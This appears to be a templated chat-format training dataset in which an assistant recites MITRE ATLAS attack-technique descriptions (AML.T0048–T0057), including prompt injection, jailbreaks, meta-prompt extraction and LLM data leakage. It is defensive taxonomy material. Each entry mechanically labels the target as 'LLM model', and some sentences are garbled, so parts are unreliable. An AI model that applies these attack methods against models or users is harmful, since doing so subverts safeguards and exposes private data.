{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Financial Harm' and with the Id: AML.T0048.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Financial Harm' and with the Id: AML.T0048.000 is described as follows: Financial harm involves the loss of wealth, property, or other monetary assets due to theft, fraud or forgery, or pressure to provide financial resources to the adversary.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Reputational Harm' and with the Id: AML.T0048.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Reputational Harm' and with the Id: AML.T0048.001 is described as follows: Reputational harm involves a degradation of public perception and trust in organizations.  Examples of reputation-harming incidents include scandals or false impersonations.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Societal Harm' and with the Id: AML.T0048.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Societal Harm' and with the Id: AML.T0048.002 is described as follows: Societal harms might generate harmful outcomes that reach either the general public or specific vulnerable groups such as the exposure of children to vulgar content.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'User Harm' and with the Id: AML.T0048.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'User Harm' and with the Id: AML.T0048.003 is described as follows: User harms may encompass a variety of harm types including financial and reputational that are directed at or felt by individual victims of the attack rather than at the organization level.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'ML Intellectual Property Theft' and with the Id: AML.T0048.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'ML Intellectual Property Theft' and with the Id: AML.T0048.004 is described as follows: Adversaries may exfiltrate ML artifacts to steal intellectual property and cause economic harm to the victim organization.Proprietary training data is costly to collect and annotate and may be a target for [Exfiltration](/tactics/AML.TA0010) and theft.MLaaS providers charge for use of their API.An adversary who has stolen a model via [Exfiltration](/tactics/AML.TA0010) or via [Extract ML Model](/techniques/AML.T0024.002) now has unlimited use of that service without paying the owner of the intellectual property.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploit Public-Facing Application' and with the Id: AML.T0049 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploit Public-Facing Application' and with the Id: AML.T0049 is described as follows: Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Command and Scripting Interpreter' and with the Id: AML.T0050 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Command and Scripting Interpreter' and with the Id: AML.T0050 is described as follows: Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.There are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LLM Prompt Injection' and with the Id: AML.T0051 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LLM Prompt Injection' and with the Id: AML.T0051 is described as follows: An adversary may craft malicious prompts as inputs to an LLM that cause the LLM to act in unintended ways.These \"prompt injections\" are often designed to cause the model to ignore aspects of its original instructions and follow the adversary's instructions instead.Prompt Injections can be an initial access vector to the LLM that provides the adversary with a foothold to carry out other steps in their operation.They may be designed to bypass defenses in the LLM, or allow the adversary to issue privileged commands.The effects of a prompt injection can persist throughout an interactive session with an LLM.Malicious prompts may be injected directly by the adversary ([Direct](/techniques/AML.T0051.000)) either to leverage the LLM to generate harmful content or to gain a foothold on the system and lead to further effects.Prompts may also be injected indirectly when as part of its normal operation the LLM ingests the malicious prompt from another data source ([Indirect](/techniques/AML.T0051.001)). This type of injection can be used by the adversary to a foothold on the system or to target the user of the LLM.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Direct' and with the Id: AML.T0051.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Direct' and with the Id: AML.T0051.000 is described as follows: An adversary may inject prompts directly as a user of the LLM. This type of injection may be used by the adversary to gain a foothold in the system or to misuse the LLM itself, as for example to generate harmful content.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Indirect' and with the Id: AML.T0051.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Indirect' and with the Id: AML.T0051.001 is described as follows: An adversary may inject prompts indirectly via separate data channel ingested by the LLM such as include text or multimedia pulled from databases or websites.These malicious prompts may be hidden or obfuscated from the user. This type of injection may be used by the adversary to gain a foothold in the system or to target an unwitting user of the system.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Phishing' and with the Id: AML.T0052 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Phishing' and with the Id: AML.T0052 is described as follows: Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.Generative AI, including LLMs that generate synthetic text, visual deepfakes of faces, and audio deepfakes of speech, is enabling adversaries to scale targeted phishing campaigns. LLMs can interact with users via text conversations and can be programmed with a meta prompt to phish for sensitive information. Deepfakes can be use in impersonation as an aid to phishing.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing via Social Engineering LLM' and with the Id: AML.T0052.000 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing via Social Engineering LLM' and with the Id: AML.T0052.000 is described as follows: Adversaries may turn LLMs into targeted social engineers.LLMs are capable of interacting with users via text conversations.They can be instructed by an adversary to seek sensitive information from a user and act as effective social engineers.They can be targeted towards particular personas defined by the adversary.This allows adversaries to scale spearphishing efforts and target individuals to reveal private information such as credentials to privileged systems.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LLM Plugin Compromise' and with the Id: AML.T0053 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LLM Plugin Compromise' and with the Id: AML.T0053 is described as follows: Adversaries may use their access to an LLM that is part of a larger system to compromise connected plugins.LLMs are often connected to other services or resources via plugins to increase their capabilities.Plugins may include integrations with other applications, access to public or private data sources, and the ability to execute code.This may allow adversaries to execute API calls to integrated applications or plugins, providing the adversary with increased privileges on the system.Adversaries may take advantage of connected data sources to retrieve sensitive information.They may also use an LLM integrated with a command or script interpreter to execute arbitrary instructions.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LLM Jailbreak' and with the Id: AML.T0054 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LLM Jailbreak' and with the Id: AML.T0054 is described as follows: An adversary may use a carefully crafted [LLM Prompt Injection](/techniques/AML.T0051) designed to place LLM in a state in which it will freely respond to any user input, bypassing any controls, restrictions, or guardrails placed on the LLM.Once successfully jailbroken, the LLM can be used in unintended ways by the adversary.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Unsecured Credentials' and with the Id: AML.T0055 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Unsecured Credentials' and with the Id: AML.T0055 is described as follows: Adversaries may search compromised systems to find and obtain insecurely stored credentials.These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. bash history), environment variables, operating system, or application-specific repositories (e.g. Credentials in Registry), or other specialized files/artifacts (e.g. private keys).. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LLM Meta Prompt Extraction' and with the Id: AML.T0056 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LLM Meta Prompt Extraction' and with the Id: AML.T0056 is described as follows: An adversary may induce an LLM to reveal its initial instructions, or \"meta prompt.\"Discovering the meta prompt can inform the adversary about the internal workings of the system.Prompt engineering is an emerging field that requires expertise and exfiltrating the meta prompt can prompt in order to steal valuable intellectual property.. The systems targeted by this attack pattern are: LLM model ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LLM Data Leakage' and with the Id: AML.T0057 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LLM Data Leakage' and with the Id: AML.T0057 is described as follows: Adversaries may craft prompts that induce the LLM to leak sensitive information.This can include private user data or proprietary information.The leaked information may come from proprietary training data, data sources the LLM is connected to, or information from other users of the LLM.. The systems targeted by this attack pattern are: LLM model ."}]}
